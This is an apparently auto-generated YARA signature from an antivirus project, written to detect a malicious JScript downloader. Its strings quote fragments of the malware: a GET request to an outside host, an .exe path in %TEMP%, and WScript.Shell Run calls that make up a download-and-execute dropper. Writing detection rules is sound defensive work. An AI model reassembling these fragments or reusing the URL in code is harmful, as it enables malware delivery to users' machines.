rule sig_20160329_21908ce3c99cc1bd1dfd27ba2339dfb5 {
  meta:
    description = "datamaliciousorder - file 20160329_21908ce3c99cc1bd1dfd27ba2339dfb5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b4fc486cbe7ddb0cc8dcf6315ed4c22347f62c2816174afd9cd760c1350556ca"

  strings:
    $s1  = "function Rqujg() {return Gqott[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"HSxxeS1aRb4s.exe\";};" fullword ascii
    $s2  = "Sjirvel[Kpavvk](\"GET\", \"http://baskinandbraw.com/wo8pfd\", false);" fullword ascii
    $s3  = "do {WScript[Vojmdqa](Hwhjvjqrm() * 11)} while (Sjirvel[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Gqott = function Mtixf() {return WScript[Hxcizltlc](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Klhxnxe(Huaup, Edsvirosfv){return Huaup - Edsvirosfv;};" fullword ascii
    $s6  = "function Vmkqmookt() {return ((Tbgouzrwe == true) && (Tbgouzrwe == Fkvatuv)) ? 1 : Yvuxfw;};" fullword ascii
    $s7  = "function Wddwnrp(Ppjnidiwqh){Gqott[\"Run\"](Ppjnidiwqh, Yvuxfw, Yvuxfw);};" fullword ascii
    $s8  = "function Hwhjvjqrm(){return 22;};" fullword ascii
    $s9  = "Tbgouzrwe = true; " fullword ascii
    $s10 = "var Fkvatuv = false;" fullword ascii
    $s11 = " while (Pzvou){" fullword ascii
    $s12 = "function Esrlrme(Jrhxvko) {var Ptqiusah = (1, 2, 3, 4, 5, Jrhxvko); return Ptqiusah;};" fullword ascii
    $s13 = "var Stceesl = false;" fullword ascii
    $s14 = "var Tbgouzrwe = false;" fullword ascii
    $s15 = "function Mvnnznx(){return Hxcizltlc;};" fullword ascii
    $s16 = "Fkvatuv = true; " fullword ascii
    $s17 = "var Epzqaaqu = new this[\"Date\"]();" fullword ascii
    $s18 = "function Kdgiwrmgv()" fullword ascii
    $s19 = "function Eubgchu(){return Nlmgxqore;};" fullword ascii
    $s20 = "return Klhxnxe(Gfugseojy, Whjnlo);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}